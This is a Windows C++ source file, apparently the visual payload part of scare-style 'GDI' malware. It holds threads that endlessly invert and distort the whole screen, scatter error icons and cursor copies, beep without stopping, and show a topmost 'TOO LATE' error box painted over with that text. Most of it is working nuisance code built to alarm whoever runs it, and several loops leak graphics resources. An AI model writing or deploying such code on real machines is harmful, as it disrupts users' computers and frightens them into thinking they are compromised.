#include<Windows.h>
#include<math.h>
HCRYPTPROV prov;
int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}
#define thread(name) DWORD WINAPI name(LPVOID lpParam)
#define rt(thrdname) CreateThread(NULL, 0, thrdname, NULL, 0, NULL);
DWORD WINAPI pat(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	for(;;){
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 50, 50, w - 100, h - 100, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 100, 100, w - 200, h - 200, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 150, 150, w - 300, h - 300, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 200, 200, w - 400, h - 400, PATINVERT);
		SelectObject(hdc, CreateSolidBrush(RGB(rand() % 256, rand() % 256, rand() % 256)));
		PatBlt(hdc, 250, 250, w - 500, h - 500, PATINVERT);
	}
	return 0;
}
POINT mkp(int x, int y){
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}
DWORD WINAPI wave(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	int y = h / 3;
	int r = y / 2;
	int d, i;
	for(int cnt = 0;cnt < 12;cnt++){
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	StretchBlt(hcdc, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * i - i * i));
		StretchBlt(hcdc, -d, i, w, 10, hdc, 0, i, w, 10, SRCCOPY);
	}
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * (r - i) - (r - i) * (r - i)));
		StretchBlt(hcdc, -d, i + r, w, 10, hdc, 0, i + r, w, 10, SRCCOPY);
	}
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * i - i * i));
		StretchBlt(hcdc, d, i + r * 2, w, 10, hdc, 0, i + r * 2, w, 10, SRCCOPY);
	}
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * (r - i) - (r - i) * (r - i)));
		StretchBlt(hcdc, d, i + r * 3, w, 10, hdc, 0, i + r * 3, w, 10, SRCCOPY);
	}
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * i - i * i));
		StretchBlt(hcdc, -d, i + r * 4, w, 10, hdc, 0, i + r * 4, w, 10, SRCCOPY);
	}
	for(i = 0; i <= r; i += 10){
		d = sqrt(float(2 * r * (r - i) - (r - i) * (r - i)));
		StretchBlt(hcdc, -d, i + r * 5, w, 10, hdc, 0, i + r * 5, w, 10, SRCCOPY);
	}
	StretchBlt(hdc, 0, 0, w, h, hcdc, 0, 0, w, h, SRCCOPY);
	}
	return 0;
}
DWORD WINAPI _Ellipse(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	int i = 0;
	int n = 50;
	int x = random()%(w - 400);
	int y = random()%(h - 400);
	for(int cnt = 0;cnt < 50;cnt++){
		if(n >= 450){
			x = random()%(w - 400);
			y = random()%(h - 400);
			n = 50;
			i = 0;
			
		}
		HDC hcdc = CreateCompatibleDC(hdc);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, NOTSRCCOPY);
		HBRUSH hBrush = CreatePatternBrush(hBitmap);
		SelectObject(hdc, hBrush);
		for(; i <= n; i += 10){
			Ellipse(hdc, x-i, y-i, x+i, y+i);
			Sleep(20);
		}
		DeleteObject(hBrush);
		DeleteObject(hBitmap);
		n += 50;
	}
	return 0;
}
DWORD WINAPI Stretch(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for(int i = 0;i < 1200;i++){
		int _w = random()%100+400,_h = random()%100+400;
		int x = random()%(w - _w),y = random()%(h - _h);
		StretchBlt(hdc, x + (5 - random()%10), y + (5 - random()%10), _w + (5 - random()%10), _h + (5 - random()%10), hdc, x, y, _w, _h, SRCCOPY);
		StretchBlt(hdc, x + (5 - random()%10), y + (5 - random()%10), _w + (5 - random()%10), _h + (5 - random()%10), hdc, x, y, _w, _h, SRCCOPY);
		StretchBlt(hdc, x + (5 - random()%10), y + (5 - random()%10), _w + (5 - random()%10), _h + (5 - random()%10), hdc, x, y, _w, _h, SRCCOPY);
	}
	return 0;
}
void _DrawError(bool x){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	int icnsz = GetSystemMetrics(SM_CXICON);
	HDC hdc = GetDC(NULL);
	POINT p;
	if(x){
		p = mkp(0, random()%h);
	}else{
		p = mkp(random()%w, 0);
	}
	for(;;){
		if(p.x >= w || p.y >= h){
			return;
		}
		DrawIcon(hdc, p.x, p.y, LoadIcon(NULL, IDI_ERROR));
		p.x += icnsz;
		p.y += icnsz;
		Sleep(50);
	}
	return;
}
DWORD WINAPI DrawError(LPVOID lpParameter){
	for(int i = 0;i < 30;i++){
		_DrawError(random()%2);
	}
	return 0;
}
DWORD WINAPI CopyCur(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for(;;){
		CURSORINFO pci; 
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		DrawIcon(hdc, random()%w, random()%h, pci.hCursor);
		Sleep(400);
	}
	return 0;
}
DWORD WINAPI Tunnel(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	for(int i = 0;i < 100;i++){
		POINT ps[3] = {mkp(0,h / 8), mkp(w - (w / 8),0), mkp(w / 8, h)};
		PlgBlt(hdc, ps, hdc, 0, 0, w, h, 0, 0, 0);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI Sound(LPVOID lpParameter){
	for(;;){
		Beep((500+random()%500), 500);
		Sleep(800);
	}
	return 0;
}
DWORD WINAPI MoveDesk(LPVOID lpParameter){
	int w = GetSystemMetrics(SM_CXSCREEN),h = GetSystemMetrics(SM_CYSCREEN);
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	for(int i = 0; i <= 100; i++){
		BitBlt(hcdc, 0, 0, w / 10, h, hdc, w / 10 * 9, 0, SRCCOPY);
		BitBlt(hcdc, w / 10, 0, w / 10 * 9, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
	}
	return 0;
}
DWORD WINAPI _MSG(LPVOID lpParameter){
	MessageBox(NULL, " ", "TOO LATE", MB_RETRYCANCEL|MB_ICONERROR|MB_TOPMOST);
	return 0;
}
void WelcomeWnd(){
	HWND wnd = FindWindow(NULL, "TOO LATE");
	HDC dc = GetWindowDC(wnd);
	RECT rect;
	GetWindowRect(wnd, &rect);
	int wx = rect.right - rect.left;
	int wy = rect.bottom - rect.top;
	StretchBlt(dc, 0, wy, wx, -wy, dc, 0, 0, wx, wy, NOTSRCCOPY);
	for(int i = 0;i < 30; i++){
		TextOut(dc, random()%wx, random()%wy, "TOO LATE", 8);
	}
}